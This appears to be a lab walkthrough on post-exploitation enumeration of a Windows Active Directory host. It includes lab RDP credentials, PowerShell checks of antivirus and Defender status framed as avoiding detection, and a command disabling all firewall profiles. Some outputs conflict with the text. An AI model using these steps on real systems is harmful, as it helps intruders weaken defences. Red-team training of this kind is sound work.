Task 1 - Introduction
--------------------------------

Once we have an initial foothold in the system, it is essential that we begin enumeration so that we can become as familiar with our new environment as possible. This will help us make decisions on what to do and where to pivot next. Now that we have this new foothold, it is time to begin post-exploitation.

This room will cover the commonly-used concepts, technologies and products that we need to be aware of.

It is assumed at this point that we already have established an initial foothold.  and are ready to expland our knowledge more about the environment by enumerating for the following:

-   Network infrastrucutre
-   Active Directory Environment
-   Users and Groups
-   Host-based security solutions
-   Network-based security solutions
-   Applications and services

__Questions__

Let's start learning!
Answer: _None Needed_


Task 2 - Deploy the VM
--------------------------------------

Start the VM.

Connect via split-screen or by RDP once you connect to either the Attackbox or via VPN.

`xfreerdp /v:kkidd /p:Pass123321@ /cert:ignore /smart-sizing:1600x1200 +clipboard`

__Questions__

Let's discuss the common network infrastructure in the next task!

Answer: _None Needed_


Task 3 -  Network Infrastructure
--------------------------------------------------------

Once we gain our first foothold on the new system, our first goal must be to enumerate the system to find out where we are and we we can get to.  We need to understand what services the machine provides, what kind of network we are in, etc. This task will discuss the common types of networks we may face during a Red Team engagement.

Typically network segmentation via additional subnets/vlans are an extra layer of protection on the network which will keep users from unauthorized access to customer data, financial records, etc.

Hosts within a these VLANs may only communicate with other hosts within the same VLAN.

### Internal Networks
Internal Networks are subnetworks are segregated based on their importance of accessibility of its data.  The main purpose of the internal network(s) is to share information, faster and easier communications, collaboration tools, operational systems, and network services within an organization.  Some reasons that network administrators use to segment the network are:

* Controlling Network Traffic
* Optimizing Network Performance
* Improving Security Posture

### A Demilitarized Zone (DMZ)
A DMZ Network is an edge network employees use to put hosts on the Internet, where they are actually on a subnetwork between the company networks and the actual Internet. It provides an extra layer of protection.

Companies use these DMZ's to host public services such as DNS, FTP, Proxy, VPN, etc.

DMZ network traffic is **untrusted traffic**

### Network Enumeration
During this phase there are some things we want to check:

* TCP ports
* UDP ports
* Established Connections
* Routing Tables
* ARP Tables
* etc

We can gather TCP and UDP open ports using the `netstat` command.

```Powershell
PS C:\Users\thm> netstat -na

Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:88             0.0.0.0:0              LISTENING
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING
  TCP    0.0.0.0:389            0.0.0.0:0              LISTENING
```

Next we can check out the ARP table, which contains the IP address and the physical address of the computers that communicated with the target within the network. This information may help us understand possible new pivot points.

```Powershell
PS C:\Users\thm> arp -a

Interface: 10.10.141.51 --- 0xa
  Internet Address      Physical Address      Type
  10.10.0.1             02-c8-85-b5-5a-aa     dynamic
  10.10.255.255         ff-ff-ff-ff-ff-ff     static
```

### Internal Network Services
In this example, we see only private networks in the arp table. It looks like this machine only has access to the internal network.  It will not be accessible outside of the network from the Internet, however once we have a foothold here we can access internal network services.

We will discuss more Windows applications and services in Task 9.

__Questions__

Read the above!
Answer: _None Needed_


Task 4 - Active Directory (AD) Environment
---------------------------------------------------------------------

### What is the Active Directory (AD) Environment?

![[ad-1.png]]

AD  is a Windows-based directory service that stores and provides data objects to the internal network environment. It allows for centralized management of authentication and authorization. The AD contains essential information about the network and the environment, including users, computers, printers, etc. For example, AD might have users' details such as job title, phone number, address, passwords, groups, permission, etc.

![[ad-2.png]]

The above diagram is one possible arrangement, where the Domain Controller (DC) is placed in a Servers network, and the other workstations are placed in a Controlled Network which is separated by Firewall. Those workstations can join the domain and use AD services through the firewall which has various Access Control Lists (ACLs) opened to allow this communication.

Here are some AD components that we need to be familiar with:

-   Domain Controllers
-   Organizational Units
-   AD objects
-   AD Domains
-   Forest
-   AD Service Accounts: Built-in local users, Domain users, Managed service accounts
-   Domain Administrators

The **Domain Controller (DC)** is a Windows server that provides AD services and controls the entire domain.  It is a form of centralized user management that provides encryption of user data as well as controlling access to a network, including users, groups, policies, and computers. It also enables resource access and sharing. These are all reasons why attackers target a domain controller in a domain because it contains a lot of high-value information.

![[ad-3.png]]

**Organizational Units (OU's)** are containers within the AD domain with a hierarchical structure.

**Active Directory Objects** can be a single user or a group, or a hardware component, such as a computer or printer. Each domain holds a database that contains object identity information that creates an AD environment, including:

-   Users - A security principal that is allowed to authenticate to machines in the domain
-   Computers - A special type of user accounts
-   GPOs - Collections of policies that are applied to other AD objects

**AD domains** are a collection of Microsoft components within an AD network. 

**AD Forest** is a collection of domains that trust each other.

![[ad-4.png]]

If we find that the network we have access to has an AD environment, it is significant because we can enumerate this information and leverage methods of exploiting AD to gain further access in the lateral movement stage.

__Questions__

In order to check whether the Windows machine is part of the AD environment or not, one way, we can use the command prompt systeminfo command. The output of the systeminfo provides information about the machine, including the operating system name and version, hostname, and other hardware information as well as the AD domain.

```Powershell
PS C:\Users\thm> systeminfo | findstr Domain
OS Configuration:          Primary Domain Controller
Domain:                    thmdomain.com
```

From the above output, we can see that the computer name is an AD with thmdomain.com as a domain name which confirms that it is a part of the AD environment. 

Note that if we get WORKGROUP in the domain section, then it means that this machine is part of a local workgroup.

Before going any further, ensure the attached machine is deployed and try what we discussed. **Is the attached machine part of the AD environment? (Y|N)**
Answer: _Y_

If it is part of an AD environment, **what is the domain name of the AD?**
Answer: _thmredteam.com_

![[ad-env-1.jpg]]


Task 5 - Users and Groups Management
----------------------------------------------------------------

In this task we will be learning more about users and groups in the AD structure. Gathering information in this compromised machine that will be critical to use in next steps. Account discovery is one of the 1st steps once we gain access. 

AD contains various accounts with the permissions, roles and purposes. Common AD service accounts include built-in local accounts, domain user accounts, managed service accounts, and virtual accounts.

-   The built-in local users' accounts are used to manage the system locally, which is not part of the AD environment.
-   Domain user accounts with access to an active directory environment can use the AD services (managed by AD).
-   AD managed service accounts are limited domain user account with higher privileges to manage AD services.
-   Domain Administrators are user accounts that can manage information in an Active Directory environment, including AD configurations, users, groups, permissions, roles, services, etc. One of the red team goals in engagement is to hunt for information that leads to a domain administrator having complete control over the AD environment.

The following are Active Directory Administrators accounts:

| BUILTIN\Administrator | Local admin access on a domain controller              |
| --------------------- | ------------------------------------------------------ |
| Domain Admins         | Administrative access to all resources in the domain   |
| Enterprise Admins     | Available only in the forest root                      |
| Schema Admins         | Capable of modifying domain/forest; useful for redteam |
| Server Operators      | Can manage domain servers                              |
| Account Operators     | Can manage users that are not in privileged groups     |
|                       |                                                        |

Now that we know some of the basic info on accounts, let's enumerate that compromised Windows box. As a current user, we have specific permissions to view or manage things within the machine and the AD environment.

### Active Directory (AD) Enum

Enumerating AD will require differnt sets of tools. Once we confirm that the machine is part of AD, we can start hunting for other variables and info that we can use later on. At this stage we will use PowerShell to enumerate for users and groups.

The following PowerShell command is to get all the AD user accounts. 

`Get-ADUser -Filter *`

![[ad-env-2.jpg]]

We can also use the [LDAP hierarchical tree structure](http://www.ietf.org/rfc/rfc2253.txt) to find a user within the AD environment. The Distinguished Name (DN) is a collection of comma-separated key and value pairs used to identify unique records within the directory. The DN consists of Domain Component (DC), OrganizationalUnitName (OU), Common Name (CN), and others. The following "CN=User1,CN=Users,DC=thmredteam,DC=com" is an example of DN, which can be visualized as follow:


Using SearchBase option, we can look for the CN in AD.  For example, we can list any user in the Users  Group:

```PowerShell
PS C:\Users\thm> Get-ADUser -Filter * -SearchBase "CN=Users,DC=THMREDTEAM,DC=COM"


DistinguishedName : CN=Administrator,CN=Users,DC=thmredteam,DC=com
Enabled           : True
GivenName         :
Name              : Administrator
ObjectClass       : user
ObjectGUID        : 4094d220-fb71-4de1-b5b2-ba18f6583c65
SamAccountName    : Administrator
SID               : S-1-5-21-1966530601-3185510712-10604624-500
Surname           :
UserPrincipalName :
```


__Questions__

  
Use the Get-ADUser -Filter * -SearchBase command to list the available user accounts within THM OU in the thmredteam.com domain. How many users are available?

```PowerShell
PS C:\Users\thm> Get-ADUser -Filter * -SearchBase "OU=THM,DC=THMREDTEAM,DC=COM"
```

Answer: _6_

Once you run the previous command, what is the UserPrincipalName (email) of the admin account?

![[ad-env-3.jpg]]

Answer: _thmadmin@thmredteam.com_



Task 6 - Host Security Solution #1
--------------------------------------------------------

Before doing any deeper analysis, we need to check the state of the hosts security solutions. We want to see the chances of getting caught.

In this task we discuss both **host** and **network** security solutions.

### Host Security Solutions

These are a set of software to monitor and detect abnormal/malicious activities on the host including:

1.  Antivirus software  
2.  Microsoft Windows Defender
3.  Host-based Firewall
4.  Security Event Logging and Monitoring   
5.  Host-based Intrusion Detection System (HIDS)/ Host-based Intrusion Prevention System (HIPS)
6.  Endpoint Detection and Response (EDR)

```powershell
Windows PowerShell
Copyright (C) Microsoft Corporation. All rights reserved.

PS C:\Users\kkidd> wmic /namespace:\\root\securitycenter2 path antivirusproduct
Node - AD
ERROR:
Description = Invalid namespace


PS C:\Users\kkidd> Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
Get-CimInstance : Invalid namespace
At line:1 char:1
+ Get-CimInstance -Namespace root/SecurityCenter2 -ClassName AntivirusP ...
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : MetadataError: (root/SecurityCenter2:AntivirusProduct:String) [Get-CimInstance], CimExce
   ption
    + FullyQualifiedErrorId : HRESULT 0x8004100e,Microsoft.Management.Infrastructure.CimCmdlets.GetCimInstanceCommand

PS C:\Users\kkidd>

```

As a result, there is a third-party antivirus (Bitdefender Antivirus) and Windows Defender installed on the computer. **Note** that Windows servers may not have SecurityCenter2 namespace, which may not work on the attached VM. Instead, it works for Windows workstations!

### Microsoft Windows Defender

Windows Defender is a pre-installed anitvirus solution from Microsoft.  It uses various algorithms in the detection, including machine learning, big-data analysis, in-depth threat resistance research, and Microsoft cloud infrastructure in protection against malware and viruses. MS Defender works in three protection modes: Active, Passive, Disable modes.

Here are the 3 modes:

*Active* - The primary mode where the antivirus solution is active and protecting.
*Passive* - This is when a 3rd party antivirus solution is installed. It works as a backup scanner here but does not remediate threats.
*Disable* - This is when Defender is disabled or uninstalled.

Here is the command to check the state of Defender:

```powershell
PS C:\Users\kkidd> Get-Service WinDefend

Status   Name               DisplayName
------   ----               -----------
Running  WinDefend          Windows Defender Antivirus Service


PS C:\Users\kkidd>
```

Next, we can start using the Get-MpComputerStatus cmdlet to get the current Windows Defender status. However, it provides the current status of security solution elements, including Anti-Spyware, Antivirus, LoavProtection, Real-time protection, etc. We can use select to specify what we need for as follows:

```powershell
PS C:\Users\kkidd> Get-MpComputerStatus | select RealTimeProtectionEnabled

RealTimeProtectionEnabled
-------------------------
                    False


PS C:\Users\kkidd>
```

Next we have a **host-based Firewall** It is a security tool installed on a machine that can prevent or block attack attempts.

The main purpose of a firewall is to control the inbound and outbound traffic that goes through a devices interface(s).  Modern firewalls can do deep analysis, stateful inspection of traffic etc.

Firewalls provides control at the network layer, so it can block/allow network packets such as ping (ICMP).  The next-gen firewalls can also work at the OSI layers, such as application layers to block things like SQL injection attacks, etc.

```powershell
PS C:\Users\kkidd> Get-NetFirewallProfile | Format-Table Name, Enabled

Name    Enabled
----    -------
Domain    False
Private   False
Public    False
```

If we have admin privileges on the current user we logged in with, then we try to disable one or more than one firewall profile using the Set-NetFirewallProfile cmdlet.

```powershell

PS C:\Users\kkidd> Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False
PS C:\Users\kkidd> Get-NetFirewallProfile | Format-Table Name, Enabled

Name    Enabled
----    -------
Domain    False
Private   False
Public    False
```

We can also check the firewall rules:

```powershell
PS C:\Users\kkidd> Get-NetFirewallRule | select DisplayName, Enabled, Description

DisplayName                                                                  Enabled Description
-----------                                                                  ------- -----------
Virtual Machine Monitoring (DCOM-In)                                           False Allow DCOM traffic for remote W...
Virtual Machine Monitoring (Echo Request - ICMPv4-In)                          False Echo Request messages are sent ...
Virtual Machine Monitoring (Echo Request - ICMPv6-In)                          False Echo Request messages are sent ...
Virtual Machine Monitoring (NB-Session-In)                                     False Allow NetBIOS Session Service c...
Virtual Machine Monitoring (RPC)                                               False Allow Task Scheduler service to...
SNMP Trap Service (UDP In)                                                     False Inbound rule for the SNMP Trap ...
SNMP Trap Service (UDP In)                                                     False Inbound rule for the SNMP Trap ...
Connected User Experiences and Telemetry                                        True Unified Telemetry Client Outbou...
Delivery Optimization (TCP-In)                                                  True Inbound rule to allow Delivery ...
Delivery Optimization (UDP-In)                                                  True Inbound rule to allow Delivery ...
Remote Event Monitor (RPC)                                                     False Inbound rule for remote event m...
Remote Event Monitor (RPC-EPMAP)                                               False Inbound rule for the RPCSS serv...
Network Discovery (UPnP-In)                                                    False Inbound rule for Network Discov...
Network Discovery (UPnP-Out)                                                   False Outbound rule for Network Disco...
Network Discovery (NB-Name-In)                                                 False Inbound rule for Network Discov...
Network Discovery (NB-Name-Out)                                                False Outbound rule for Network Disco...
Network Discovery (NB-Datagram-In)                                             False Inbound rule for Network Discov...
Network Discovery (NB-Datagram-Out)                                            False Outbound rule for Network Disco...
Network Discovery (WSD EventsSecure-In)                                        False Inbound rule for Network Discov...
Network Discovery (WSD EventsSecure-Out)                                       False Outbound rule for Network Disco...
Network Discovery (WSD Events-In)                                              False Inbound rule for Network Discov...
Network Discovery (WSD Events-Out)                                             False Outbound rule for Network Disco...
Network Discovery (SSDP-In)                                                    False Inbound rule for Network Discov...
Network Discovery (SSDP-Out)                                                   False Outbound rule for Network Disco...
Network Discovery (UPnPHost-Out)                                               False Outbound rule for Network Disco...
Network Discovery (WSD-In)                                                     False Inbound rule for Network Discov...
Network Discovery (WSD-Out)                                                    False Outbound rule for Network Disco...
Network Discovery (LLMNR-UDP-In)                                               False Inbound rule for Network Discov...
Network Discovery (LLMNR-UDP-Out)                                              False Outbound rule for Network Disco...
Network Discovery (Pub-WSD-In)                                                 False Inbound rule for Network Discov...
Network Discovery (Pub WSD-Out)                                                False Outbound rule for Network Disco...
AllJoyn Router (TCP-In)                                                         True Inbound rule for AllJoyn Router...
AllJoyn Router (TCP-Out)                                                        True Outbound rule for AllJoyn Route...
AllJoyn Router (UDP-In)                                                         True Inbound rule for AllJoyn Router...
AllJoyn Router (UDP-Out)                                                        True Outbound rule for AllJoyn Route...
Netlogon Service (NP-In)                                                       False Inbound rule for the NetLogon s...
Netlogon Service Authz (RPC)                                                   False Inbound rule for the NetLogon s...
Inbound Rule for Remote Shutdown (TCP-In)                                      False Inbound rule for the Remote Shu...
Inbound Rule for Remote Shutdown (RPC-EP-In)                                   False Inbound rule for the RPCSS serv...
Secure Socket Tunneling Protocol (SSTP-In)                                     False Inbound rule to allow HTTPS tra...
File and Printer Sharing over SMBDirect (iWARP-In)                             False Inbound rule for File and Print...
DIAL protocol server (HTTP-In)                                                  True Inbound rule for DIAL protocol ...
DIAL protocol server (HTTP-In)                                                  True Inbound rule for DIAL protocol ...
Remote Scheduled Tasks Management (RPC)                                        False Inbound rule for the Task Sched...
Remote Scheduled Tasks Management (RPC-EPMAP)                                  False Inbound rule for the RPCSS serv...
Windows Device Management Enrollment Service (TCP out)                          True Allow outbound TCP traffic from...
Windows Remote Management (HTTP-In)                                             True Inbound rule for Windows Remote...
Windows Remote Management (HTTP-In)                                             True Inbound rule for Windows Remote...
Windows Remote Management - Compatibility Mode (HTTP-In)                       False Compatibility mode inbound rule...
BranchCache Content Retrieval (HTTP-In)                                        False Inbound rule for BranchCache to...
BranchCache Content Retrieval (HTTP-Out)                                       False Outbound rule for BranchCache t...
BranchCache Peer Discovery (WSD-In)                                            False Inbound rule for BranchCache to...
BranchCache Peer Discovery (WSD-Out)                                           False Outbound rule for BranchCache t...
BranchCache Hosted Cache Server (HTTP-In)                                      False Inbound rule for BranchCache to...
BranchCache Hosted Cache Server(HTTP-Out)                                      False Outbound rule for BranchCache t...
BranchCache Hosted Cache Client (HTTP-Out)                                     False Outbound rule for BranchCache t...
Remote Desktop - User Mode (TCP-In)                                             True Inbound rule for the Remote Des...
Remote Desktop - User Mode (UDP-In)                                             True Inbound rule for the Remote Des...
Remote Desktop - Shadow (TCP-In)                                                True Inbound rule for the Remote Des...
Remote Desktop - (TCP-WS-In)                                                   False Inbound rule for the Remote Des...
Remote Desktop - (TCP-WSS-In)                                                  False Inbound rule for the Remote Des...
Cast to Device streaming server (HTTP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (HTTP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (HTTP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTCP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTCP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTCP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTP-Streaming-Out)                             True Outbound rule for the Cast to D...
Cast to Device streaming server (RTP-Streaming-Out)                             True Outbound rule for the Cast to D...
Cast to Device streaming server (RTP-Streaming-Out)                             True Outbound rule for the Cast to D...
Cast to Device streaming server (RTSP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTSP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device streaming server (RTSP-Streaming-In)                             True Inbound rule for the Cast to De...
Cast to Device SSDP Discovery (UDP-In)                                          True Inbound rule to allow discovery...
Cast to Device UPnP Events (TCP-In)                                             True Inbound rule to allow receiving...
Cast to Device functionality (qWave-UDP-In)                                     True Inbound rule for the Cast to De...
Cast to Device functionality (qWave-UDP-Out)                                    True Outbound rule for the Cast to D...
Cast to Device functionality (qWave-TCP-In)                                     True Inbound rule for the Cast to De...
Cast to Device functionality (qWave-TCP-Out)                                    True Outbound rule for the Cast to D...
Routing and Remote Access (GRE-In)                                             False Inbound rule for RRAS to allow ...
Routing and Remote Access (GRE-Out)                                            False Outbound rule for RRAS to allow...
Routing and Remote Access (L2TP-In)                                            False Inbound rule for RRAS to allow ...
Routing and Remote Access (L2TP-Out)                                           False Outbound rule for RRAS to allow...
Routing and Remote Access (PPTP-In)                                            False Inbound rule for RRAS to allow ...
Routing and Remote Access (PPTP-Out)                                           False Outbound rule for RRAS to allow...
Windows Device Management Certificate Installer (TCP out)                       True Allow outbound TCP traffic from...
Remote Volume Management - Virtual Disk Service (RPC)                          False Inbound rule for the Remote Vol...
Remote Volume Management - Virtual Disk Service Loader (RPC)                   False Inbound rule for the Remote Vol...
Remote Volume Management (RPC-EPMAP)                                           False Inbound rule for the RPCSS serv...
File and Printer Sharing (NB-Session-In)                                        True Inbound rule for File and Print...
File and Printer Sharing (NB-Session-Out)                                       True Outbound rule for File and Prin...
File and Printer Sharing (SMB-In)                                               True Inbound rule for File and Print...
File and Printer Sharing (SMB-Out)                                              True Outbound rule for File and Prin...
File and Printer Sharing (NB-Name-In)                                           True Inbound rule for File and Print...
File and Printer Sharing (NB-Name-Out)                                          True Outbound rule for File and Prin...
File and Printer Sharing (NB-Datagram-In)                                       True Inbound rule for File and Print...
File and Printer Sharing (NB-Datagram-Out)                                      True Outbound rule for File and Prin...
File and Printer Sharing (Spooler Service - RPC)                                True Inbound rule for File and Print...
File and Printer Sharing (Spooler Service - RPC-EPMAP)                          True Inbound rule for the RPCSS serv...
File and Printer Sharing (Echo Request - ICMPv4-In)                             True Echo Request messages are sent ...
File and Printer Sharing (Echo Request - ICMPv4-Out)                            True Echo Request messages are sent ...
File and Printer Sharing (Echo Request - ICMPv6-In)                             True Echo Request messages are sent ...
File and Printer Sharing (Echo Request - ICMPv6-Out)                            True Echo Request messages are sent ...
File and Printer Sharing (LLMNR-UDP-In)                                         True Inbound rule for File and Print...
File and Printer Sharing (LLMNR-UDP-Out)                                        True Outbound rule for File and Prin...
iSCSI Service (TCP-In)                                                         False Inbound rule for the iSCSI Serv...
iSCSI Service (TCP-Out)                                                        False Outbound rule for the iSCSI Ser...
Remote Event Log Management (RPC)                                              False Inbound rule for the local Even...
Remote Event Log Management (NP-In)                                            False Inbound rule for the local Even...
Remote Event Log Management (RPC-EPMAP)                                        False Inbound rule for the RPCSS serv...
Software Load Balancer Multiplexer (TCP-In)                                    False The Software Load Balancer Mult...
Key Management Service (TCP-In)                                                False Inbound rule for the Key Manage...
Windows Device Management Sync Client (TCP out)                                 True Allow outbound TCP traffic from...
Performance Logs and Alerts (TCP-In)                                           False Inbound rule for Performance Lo...
Performance Logs and Alerts (DCOM-In)                                          False Inbound rule for Performance Lo...
Performance Logs and Alerts (TCP-In)                                           False Inbound rule for Performance Lo...
Performance Logs and Alerts (DCOM-In)                                          False Inbound rule for Performance Lo...
TPM Virtual Smart Card Management (DCOM-In)                                    False Inbound rule for remote TPM Vir...
TPM Virtual Smart Card Management (TCP-In)                                     False Inbound rule for remote TPM Vir...
TPM Virtual Smart Card Management (TCP-Out)                                    False Outbound rule for remote TPM Vi...
TPM Virtual Smart Card Management (DCOM-In)                                    False Inbound rule for remote TPM Vir...
TPM Virtual Smart Card Management (TCP-In)                                     False Inbound rule for remote TPM Vir...
TPM Virtual Smart Card Management (TCP-Out)                                    False Outbound rule for remote TPM Vi...
Core Networking - Destination Unreachable (ICMPv6-In)                           True Destination Unreachable error m...
Core Networking - Packet Too Big (ICMPv6-In)                                    True Packet Too Big error messages a...
Core Networking - Packet Too Big (ICMPv6-Out)                                   True Packet Too Big error messages a...
Core Networking - Time Exceeded (ICMPv6-In)                                     True Time Exceeded error messages ar...
Core Networking - Time Exceeded (ICMPv6-Out)                                    True Time Exceeded error messages ar...
Core Networking - Parameter Problem (ICMPv6-In)                                 True Parameter Problem error message...
Core Networking - Parameter Problem (ICMPv6-Out)                                True Parameter Problem error message...
Core Networking - Neighbor Discovery Solicitation (ICMPv6-In)                   True Neighbor Discovery Solicitation...
Core Networking - Neighbor Discovery Solicitation (ICMPv6-Out)                  True Neighbor Discovery Solicitation...
Core Networking - Neighbor Discovery Advertisement (ICMPv6-In)                  True Neighbor Discovery Advertisemen...
Core Networking - Neighbor Discovery Advertisement (ICMPv6-Out)                 True Neighbor Discovery Advertisemen...
Core Networking - Router Advertisement (ICMPv6-In)                              True Router Advertisement messages a...
Core Networking - Router Advertisement (ICMPv6-Out)                             True Router Advertisement messages a...
Core Networking - Router Solicitation (ICMPv6-In)                               True Router Solicitation messages ar...
Core Networking - Router Solicitation (ICMPv6-Out)                              True Router Solicitation messages ar...
Core Networking - Multicast Listener Query (ICMPv6-In)                          True An IPv6 multicast-capable route...
Core Networking - Multicast Listener Query (ICMPv6-Out)                         True An IPv6 multicast-capable route...
Core Networking - Multicast Listener Report (ICMPv6-In)                         True The Multicast Listener Report m...
Core Networking - Multicast Listener Report (ICMPv6-Out)                        True The Multicast Listener Report m...
Core Networking - Multicast Listener Report v2 (ICMPv6-In)                      True Multicast Listener Report v2 me...
Core Networking - Multicast Listener Report v2 (ICMPv6-Out)                     True Multicast Listener Report v2 me...
Core Networking - Multicast Listener Done (ICMPv6-In)                           True Multicast Listener Done message...
Core Networking - Multicast Listener Done (ICMPv6-Out)                          True Multicast Listener Done message...
Core Networking - Destination Unreachable Fragmentation Needed (ICMPv4-In)      True Destination Unreachable Fragmen...
Core Networking - Internet Group Management Protocol (IGMP-In)                  True IGMP messages are sent and rece...
Core Networking - Internet Group Management Protocol (IGMP-Out)                 True IGMP messages are sent and rece...
Core Networking - Dynamic Host Configuration Protocol (DHCP-In)                 True Allows DHCP (Dynamic Host Confi...
Core Networking - Dynamic Host Configuration Protocol (DHCP-Out)                True Allows DHCP (Dynamic Host Confi...
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-In)       True Allows DHCPV6 (Dynamic Host Con...
Core Networking - Dynamic Host Configuration Protocol for IPv6(DHCPV6-Out)      True Allows DHCPV6 (Dynamic Host Con...
Core Networking - Teredo (UDP-In)                                               True Inbound UDP rule to allow Tered...
Core Networking - Teredo (UDP-Out)                                              True Outbound UDP rule to allow Tere...
Core Networking - IPHTTPS (TCP-In)                                              True Inbound TCP rule to allow IPHTT...
Core Networking - IPHTTPS (TCP-Out)                                             True Outbound TCP rule to allow IPHT...
Core Networking - IPv6 (IPv6-In)                                                True Inbound rule required to permit...
Core Networking - IPv6 (IPv6-Out)                                               True Outbound rule required to permi...
Core Networking - Group Policy (NP-Out)                                         True Core Networking - Group Policy ...
Core Networking - Group Policy (TCP-Out)                                        True Outbound rule to allow remote R...
Core Networking - DNS (UDP-Out)                                                 True Outbound rule to allow DNS requ...
Core Networking - Group Policy (LSASS-Out)                                      True Outbound rule to allow remote L...
COM+ Network Access (DCOM-In)                                                  False Inbound rule to allow DCOM traf...
COM+ Remote Administration (DCOM-In)                                           False Inbound rule to allow DCOM traf...
Distributed Transaction Coordinator (TCP-In)                                   False Inbound rule to allow traffic f...
Distributed Transaction Coordinator (TCP-Out)                                  False Outbound rule to allow traffic ...
Distributed Transaction Coordinator (RPC)                                      False Inbound rule for the Kernel Tra...
Distributed Transaction Coordinator (RPC-EPMAP)                                False Inbound rule for the RPCSS serv...
Remote Service Management (RPC)                                                False Inbound rule for the local Serv...
Remote Service Management (NP-In)                                              False Inbound rule for the local Serv...
Remote Service Management (RPC-EPMAP)                                          False Inbound rule for the RPCSS serv...
mDNS (UDP-In)                                                                   True Inbound rule for mDNS traffic [...
mDNS (UDP-In)                                                                   True Inbound rule for mDNS traffic [...
mDNS (UDP-In)                                                                   True Inbound rule for mDNS traffic [...
mDNS (UDP-Out)                                                                  True Outbound rule for mDNS traffic ...
mDNS (UDP-Out)                                                                  True Outbound rule for mDNS traffic ...
mDNS (UDP-Out)                                                                  True Outbound rule for mDNS traffic ...
Windows Defender Firewall Remote Management (RPC)                              False Inbound rule for the Windows De...
Windows Defender Firewall Remote Management (RPC-EPMAP)                        False Inbound rule for the RPCSS serv...
Windows Management Instrumentation (DCOM-In)                                    True Inbound rule to allow DCOM traf...
Windows Management Instrumentation (WMI-In)                                     True Inbound rule to allow WMI traff...
Windows Management Instrumentation (WMI-Out)                                    True Outbound rule to allow WMI traf...
Windows Management Instrumentation (ASync-In)                                   True Inbound rule to allow Asynchron...
Windows Media Player x86 (UDP-In)                                              False Inbound rule for Windows Media ...
Windows Media Player x86 (UDP-Out)                                             False Outbound rule for Windows Media...
Windows Media Player x86 (TCP-Out)                                             False Outbound rule for Windows Media...
Windows Media Player (UDP-In)                                                  False Inbound rule for Windows Media ...
Windows Media Player (UDP-Out)                                                 False Outbound rule for Windows Media...
Windows Media Player (TCP-Out)                                                 False Outbound rule for Windows Media...
Windows Media Player Network Sharing Service (qWave-UDP-In)                    False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (qWave-UDP-Out)                   False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (qWave-TCP-In)                    False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (qWave-TCP-Out)                   False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (HTTP-Streaming-In)               False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (HTTP-Streaming-Out)              False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (Streaming-UDP-In)                False Inbound rule for Windows Media ...
Windows Media Player Network Sharing Service (Streaming-UDP-Out)               False Outbound rule for Windows Media...
Windows Media Player Network Sharing Service (Streaming-TCP-Out)               False Outbound rule for Windows Media...
Windows Media Player Network Sharing Service (UDP-In)                          False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (UDP-Out)                         False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (TCP-In)                          False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (TCP-Out)                         False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (qWave-UDP-In)                    False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (qWave-UDP-Out)                   False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (qWave-TCP-In)                    False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (qWave-TCP-Out)                   False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (SSDP-In)                         False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (SSDP-Out)                        False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (UPnP-In)                         False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (UPnP-Out)                        False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (HTTP-Streaming-In)               False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (HTTP-Streaming-Out)              False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (Streaming-UDP-In)                False Inbound rule for Windows Media ...
Windows Media Player Network Sharing Service (Streaming-UDP-Out)               False Outbound rule for Windows Media...
Windows Media Player Network Sharing Service (Streaming-TCP-Out)               False Outbound rule for Windows Media...
Windows Media Player Network Sharing Service (UDP-In)                          False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (UDP-Out)                         False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (TCP-In)                          False Inbound rule for the Windows Me...
Windows Media Player Network Sharing Service (TCP-Out)                         False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (UPnPHost-Out)                    False Outbound rule for the Windows M...
Windows Media Player Network Sharing Service (HTTP-Streaming-In)               False Inbound rule for the Windows Me...
Remote Desktop - User Mode (TCP-In)                                             True Inbound rule for the Remote Des...
Remote Desktop - User Mode (UDP-In)                                             True Inbound rule for the Remote Des...
Remote Desktop - Shadow (TCP-In)                                                True Inbound rule for the Remote Des...
Work or school account                                                          True Work or school account
Work or school account                                                          True Work or school account
Your account                                                                    True Your account
Your account                                                                    True Your account
Windows Shell Experience                                                        True Windows Shell Experience
Cortana                                                                         True Search the web and Windows
Cortana                                                                         True Search the web and Windows
Windows Security                                                                True Windows Security
Windows Shell Experience                                                        True Windows Shell Experience
Narrator QuickStart                                                             True Narrator QuickStart
Windows Defender SmartScreen                                                    True Windows Defender SmartScreen
Desktop App Web Viewer                                                          True Desktop App Web Viewer
